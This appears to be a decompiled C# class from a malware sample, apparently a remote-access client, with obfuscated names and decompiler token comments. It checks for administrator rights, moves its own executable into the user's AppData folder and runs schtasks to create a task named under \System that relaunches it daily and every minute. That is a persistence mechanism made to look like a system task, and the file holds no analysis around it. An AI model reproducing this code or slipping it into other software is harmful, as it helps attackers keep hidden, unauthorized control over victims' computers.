using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using RemoteClient.Polices;
using RemoteClient.Schemes;

namespace sdfsdf.Resolver
{
	// Token: 0x0200002B RID: 43
	internal class TokenizerParserResolver
	{
		// Token: 0x060000C3 RID: 195 RVA: 0x000025F9 File Offset: 0x000007F9
		private static bool OrderMapper()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x00005B8C File Offset: 0x00003D8C
		public static bool GetMapper()
		{
			string environmentVariable = Environment.GetEnvironmentVariable("AppData");
			return Process.GetCurrentProcess().MainModule.FileName == environmentVariable + "\\" + TokenizerParserResolver.m_Pool;
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x00005BD4 File Offset: 0x00003DD4
		public static void ConnectMapper()
		{
			string fileName = Process.GetCurrentProcess().MainModule.FileName;
			string environmentVariable = Environment.GetEnvironmentVariable("AppData");
			File.Move(fileName, Path.Combine(environmentVariable, TokenizerParserResolver.m_Pool));
			Process process = Process.Start(new ProcessStartInfo
			{
				FileName = "schtasks.exe",
				UseShellExecute = false,
				Arguments = "/create /tn \\System\\ZafirBera /tr \"%userprofile%\\AppData\\Roaming\\" + TokenizerParserResolver.m_Pool + "\" /st 00:00 /du 9999:59 /sc daily /ri 1 /f"
			});
			process.WaitForExit();
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x00002297 File Offset: 0x00000497
		public TokenizerParserResolver()
		{
			InvocationProcessPolicy.CompareError();
			base..ctor();
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x00005C4C File Offset: 0x00003E4C
		// Note: this type is marked as 'beforefieldinit'.
		static TokenizerParserResolver()
		{
			InvocationProcessPolicy.CompareError();
			TokenizerParserResolver._Bridge = Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
			{
				'\\'
			})[Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
			{
				'\\'
			}).Length - 1];
			TokenizerParserResolver.m_Pool = MapperProductSchema._Getter;
		}

		// Token: 0x0400008F RID: 143
		private static object _Bridge;

		// Token: 0x04000090 RID: 144
		public static string m_Pool;
	}
}
